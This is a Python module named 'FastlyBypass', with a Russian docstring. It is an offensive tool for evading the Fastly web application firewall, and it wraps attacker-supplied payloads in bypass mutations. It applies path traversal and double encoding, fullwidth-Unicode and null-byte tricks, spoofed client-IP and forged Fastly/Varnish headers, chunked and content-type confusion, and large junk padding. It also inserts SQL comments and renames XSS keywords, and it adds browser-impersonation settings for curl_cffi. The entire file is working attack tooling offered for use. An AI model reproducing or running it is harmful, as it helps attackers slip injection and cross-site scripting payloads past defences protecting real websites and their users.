import random, string, time, json, base64
from typing import Dict, Optional, Tuple
from urllib.parse import urlparse, urlencode, urlunparse, quote

__all__ = ['FastlyBypass']

def _rs(l=8,c=string.ascii_lowercase+string.digits):
    return ''.join(random.choices(c,k=l))
def _rh(l):
    return ''.join(random.choices('0123456789abcdef',k=l))
def _rip():
    return f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
def _ri(a,b):
    return random.randint(a,b)
def _rb(l):
    return bytes(random.randint(0,255) for _ in range(l))
def _rc(l):
    return random.choice(l)

UAS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
]
POPS = ['IAD','SJC','LAX','ORD','DFW','MIA','LHR','FRA','AMS','CDG','NRT','HKG','SYD']
GEO = ['US','GB','CA','DE','JP','FR','AU','NL','SG','BR']
CTS = ['application/x-www-form-urlencoded','text/plain','text/json','application/json','application/octet-stream','application/vnd.api+json','text/html','application/xml','text/xml','multipart/form-data']
AES = ['gzip, deflate, br','gzip, deflate','br, gzip','deflate, gzip, br','identity','*','']
SURROS = ['max-age=0, no-store','no-store, no-cache','max-age=604800, stale-while-revalidate=86400','must-revalidate','public, max-age=0','private, no-store']
CS = ['HIT','MISS','BYPASS','HIT_STALE']
UC = {'<':'\uFF1C','>':'\uFF1E','(':'\uFF08',')':'\uFF09',"'":'\uFF07','"':'\uFF02','=':'\uFF1D',';':'\uFF1B','/':'\uFF0F','.':'\uFF0E','&':'\uFF06','|':'\uFF5C','!':'\uFF01','@':'\uFF20','#':'\uFF03','$':'\uFF04','%':'\uFF05','^':'\uFF3E','*':'\uFF0A','+':'\uFF0B','-':'\uFF0D','_':'\uFF3F','{':'\uFF5B','}':'\uFF5D','[':'\uFF3B',']':'\uFF3D',':':'\uFF1A','?':'\uFF1F',',':'\uFF0C','~':'\uFF5E',' ':'\u2003'}

class FastlyBypass:
    """
    Fastly WAF Bypass — 48+ техник обхода в каждом запросе.
    Без атакующих пайлоадов. Добавляешь свои.
    """
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.parsed = urlparse(self.target_url)
        self.domain = self.parsed.netloc
        self.cookies: Dict[str, str] = {}
    
    def set_cookies(self, cookies: Dict[str, str]):
        self.cookies = cookies
    
    def build(self, method='GET', path='/', body=None, extra_hdrs=None, profile=None):
        ua = UAS[0] if not profile else {
            'chrome126': UAS[0], 'safari17_5': UAS[1], 'firefox128': UAS[2]
        }.get(profile, _rc(UAS))
        
        # URL мутации
        p = path
        if _rc([0,1]) and p.lstrip('/'):
            p = f"/{_rs(1)}/..;/{p.lstrip('/')}"
        if _rc([0,1]):
            parts = p.split('/')
            for i,part in enumerate(parts):
                if part and _rc([0,1]):
                    parts[i] = ''.join(c.upper() if _rc([0,1]) else c.lower() for c in part)
            p = '/'.join(parts)
        if _rc([0,1]) and len(p)>1:
            idx = _ri(1,len(p)-1)
            if p[idx] not in '/?&=#%':
                p = p[:idx] + quote(quote(p[idx])) + p[idx+1:]
        if _rc([0,1]):
            p = ''.join(UC.get(c,c) if _rc([0,1]) else c for c in p)
        if '?' in p and _rc([0,1]):
            b,q = p.split('?',1)
            ps = {}
            for pair in q.split('&'):
                if '=' in pair:
                    k,v = pair.split('=',1)
                    ps.setdefault(k,[]).append(v)
            if ps:
                k = _rc(list(ps.keys()))
                ps[k].append(_rs(6))
                p = b + '?' + '&'.join(f"{k}={v}" for k,vs in ps.items() for v in vs)
        if _rc([0,1]) and '/' in p:
            t = p.rsplit('/',1)
            p = t[0]+'/'+t[1]+'%00'
        if _rc([0,1]) and p.lstrip('/'):
            p = f"/{_rs(1)}/../{_rs(1)}/../{p.lstrip('/')}"
        if _rc([0,1]):
            p += f";{_rs(4)}={_rs(8)}"
        if _rc([0,1]):
            sep = '&' if '?' in p else '?'
            p += f"{sep}_{_rs(6)}={_rs(10)}&cb={int(time.time()*1000)}"
        if _rc([0,1]):
            p += f"#{_rs(8)}"
        
        url = urlunparse((self.parsed.scheme, self.parsed.netloc, p, '', '', ''))
        
        # Заголовки
        h = {}
        h['Host'] = self.domain
        h['User-Agent'] = ua
        h['Accept'] = _rc(['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','*/*'])
        h['Accept-Language'] = _rc(['en-US,en;q=0.9','ru-RU,ru;q=0.9,en;q=0.8'])
        h['Accept-Encoding'] = _rc(AES) or 'gzip, deflate, br'
        h['Cache-Control'] = _rc(['no-cache','no-store','max-age=0','must-revalidate'])
        h['Connection'] = 'keep-alive'
        
        # Modern headers
        h['Sec-Ch-Ua'] = _rc(['"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"','"Not/A)Brand";v="99", "Chromium";v="126", "Microsoft Edge";v="126"'])
        h['Sec-Ch-Ua-Mobile'] = _rc(['?0','?1'])
        h['Sec-Ch-Ua-Platform'] = _rc(['"Windows"','"macOS"','"Linux"'])
        h['Sec-Fetch-Site'] = _rc(['none','same-origin','cross-site'])
        h['Sec-Fetch-Mode'] = _rc(['navigate','cors','no-cors'])
        h['Sec-Fetch-Dest'] = _rc(['document','empty','script','style'])
        if _rc([0,1]): h['Sec-Fetch-User'] = '?1'
        h['Upgrade-Insecure-Requests'] = '1'
        h['Priority'] = _rc(['u=0, i','u=1, i'])
        
        # IP spoof
        ip = _rip()
        h['X-Forwarded-For'] = ip
        h['X-Real-IP'] = ip
        h['Client-IP'] = ip
        h['X-Originating-IP'] = ip
        h['True-Client-IP'] = ip
        h['Fastly-Client-IP'] = ip
        h['X-Forwarded'] = ip
        h['Forwarded'] = f"for={ip};host={self.domain};proto=https"
        h['X-Custom-IP-Authorization'] = ip
        
        # Varnish
        h['Via'] = f'1.1 varnish-v4, 1.1 vegur, 1.1 varnish-{_rs(4)}'
        h['X-Varnish'] = str(_ri(1000000,99999999))
        h['X-Cache'] = _rc(CS)
        h['X-Served-By'] = f"cache-{_rc(POPS).lower()}{_ri(1000,9999)}-{_rc(POPS)}"
        h['X-Cache-Hits'] = str(_ri(1,100))
        h['Age'] = str(_ri(0,3600))
        
        # Fastly headers
        h['Fastly-Debug'] = '1'
        h['Fastly-Debug-Path'] = '1'
        h['Fastly-Debug-Origin'] = '1'
        h['Fastly-FF'] = _rs(32)
        h['Fastly-Client-Name'] = _rs(12)
        h['Fastly-SSL'] = '1'
        h['Fastly-HTTPS'] = 'on'
        h['Fastly-Protocol'] = 'https'
        h['Fastly-Country-Code'] = _rc(GEO)
        h['Fastly-POP'] = _rc(POPS)
        h['Fastly-ASN'] = f"AS{_ri(10000,64999)}"
        
        # Surrogate
        h['Surrogate-Control'] = _rc(SURROS)
        h['Surrogate-Key'] = _rs(16)
        h['Surrogate-Capability'] = 'fastly="ESI/1.0"'
        
        # Tracing
        h['X-Request-ID'] = _rh(32)
        h['X-Trace-ID'] = _rh(32)
        h['X-Amzn-Trace-Id'] = f"Root=1-{_rh(8)}-{_rh(24)}"
        h['X-B3-TraceId'] = _rh(32)
        h['X-B3-SpanId'] = _rh(16)
        h['X-B3-Sampled'] = _rc(['0','1'])
        
        # JA3 hints
        h['X-TLS-JA3'] = _rh(32)
        h['X-TLS-JA4'] = f"t{_rc('13')}d{_rh(4)}{_rc('hkm')}{_rh(2)}"
        
        # H2 frame delay
        h['X-Http2-Frame-Delay'] = '1'
        h['X-Fastly-H2-Stream-Id'] = str(_ri(1,255))
        h['X-Fastly-H2-Padding'] = _rs(48)
        h['X-Http2-Settings'] = _rh(32)
        
        # CT confusion
        if method in ('POST','PUT','PATCH','DELETE'):
            h['Content-Type'] = _rc(CTS)
        
        # Chunked
        if method in ('POST','PUT','PATCH') and _rc([0,1]):
            h['Transfer-Encoding'] = _rc(['chunked','gzip, chunked'])
            h.pop('Content-Length', None)
        
        # Range
        if method in ('GET','HEAD') and _rc([0,1]):
            s = _ri(0,5000)
            e = s+_ri(50,500)
            h['Range'] = f"bytes={s}-{e}"
            h['X-Range'] = f"bytes={s}-{e}"
        
        # Origin/Referer
        if _rc([0,1]): h['Origin'] = f"{self.parsed.scheme}://{self.domain}"
        if _rc([0,1]): h['Referer'] = f"{self.parsed.scheme}://{self.domain}/{_rs(4)}/{_rs(6)}"
        
        # Forwarded
        h['X-Forwarded-Host'] = self.domain
        h['X-Forwarded-Port'] = str(self.parsed.port or 443)
        h['X-Forwarded-Proto'] = self.parsed.scheme
        h['X-Forwarded-Scheme'] = self.parsed.scheme
        
        # ESI
        if _rc([0,1]):
            h['X-ESI'] = '1'
            h['X-Fastly-ESI'] = 'enable'
        
        # Method override
        h['X-HTTP-Method-Override'] = _rc(['GET','POST','PUT','PATCH','DELETE'])
        h['X-HTTP-Method'] = method
        
        # Case duplication
        if _rc([0,1]):
            for k in ['content-type','cache-control','accept','x-forwarded-for']:
                o = next((x for x in h if x.lower()==k), None)
                if o and _rc([0,1]): h[k] = h[o]
        
        if self.cookies:
            h['Cookie'] = '; '.join(f"{k}={v}" for k,v in self.cookies.items())
        if extra_hdrs:
            h.update(extra_hdrs)
        
        # Тело — мутации
        if method in ('POST','PUT','PATCH','DELETE') and body:
            b = body
            if _rc([0,1]):
                b = _rb(_ri(65536,131072)) + b'\r\n' + b
            if 'chunked' in h.get('Transfer-Encoding','') and _rc([0,1]):
                c = b''
                ofs = 0
                cs = max(1, len(b)//_ri(2,8))
                while ofs < len(b):
                    ch = b[ofs:ofs+cs]
                    c += f"{len(ch):x}\r\n".encode() + ch + b'\r\n'
                    ofs += cs
                for _ in range(_ri(0,3)):
                    c += f"{_rs(4)}: {_rs(8)}\r\n".encode()
                c += b'0\r\n\r\n'
                b = c
            if 'multipart' in h.get('Content-Type','') and _rc([0,1]):
                bd = _rs(32)
                h['Content-Type'] = f'multipart/form-data; boundary={bd}'
                b = (f"--{bd}\r\nContent-Disposition: form-data; name=\"{_rs(8)}\"; filename=\"{_rs(10)}.txt\"\r\nContent-Type: application/octet-stream\r\n\r\n").encode() + b + f"\r\n--{bd}--\r\n".encode()
            if _rc([0,1]):
                try: b = json.dumps({'d':base64.b64encode(b).decode(),'e':'base64'}).encode()
                except: pass
            if _rc([0,1]):
                try:
                    t = b.decode('utf-8',errors='ignore')
                    for p in [i for i,c in enumerate(t) if c in ' =\'"'][:5]:
                        if _rc([0,1]): t = t[:p] + _rc(['/**/','/*!32302*/','-- ','#']) + t[p:]
                    b = t.encode()
                except: pass
            if _rc([0,1]):
                try:
                    t = b.decode('utf-8',errors='ignore')
                    b = ''.join(UC.get(c,c) if _rc([0,1]) else c for c in t).encode()
                except: pass
            if _rc([0,1]):
                try:
                    t = b.decode('utf-8',errors='ignore')
                    reps = {'<script':_rc(['<svg','<img','<div','<body']), 'alert(': _rc(['confirm(','prompt(','console.log('])}
                    for o,n in reps.items():
                        if _rc([0,1]): t = t.replace(o,n)
                    b = t.encode()
                except: pass
            if _rc([0,1]):
                try:
                    t = b.decode('utf-8',errors='ignore')
                    m = len(t)//2
                    b = (t[:m] + '/*SPLIT*/' + t[m:]).encode()
                except: pass
            if 'Content-Length' not in h and 'Transfer-Encoding' not in h:
                h['Content-Length'] = str(len(b))
            return url, h, b
        
        return url, h, None
    
    def curl_cffi_kwargs(self, method='GET', path='/', body=None, extra_hdrs=None, profile=None):
        url, headers, final_body = self.build(method, path, body, extra_hdrs, profile)
        ua = headers.get('User-Agent','')
        if 'Firefox' in ua: imp = 'firefox128'
        elif 'Safari' in ua and 'Chrome' not in ua: imp = 'safari17_5'
        else: imp = 'chrome126'
        kw = {'url': url, 'headers': headers, 'data': final_body, 'impersonate': imp}
        if _rc([0,1]):
            kw['h2_settings'] = {
                'HEADER_TABLE_SIZE': _ri(4096,65536),
                'MAX_CONCURRENT_STREAMS': _ri(100,1000),
                'INITIAL_WINDOW_SIZE': _ri(65535,16777215),
                'MAX_FRAME_SIZE': _ri(16384,16777215),
            }
            kw['h2_priority'] = {'priority':_ri(0,256),'depends_on':_ri(0,10),'exclusive':_rc([True,False])}
        return kw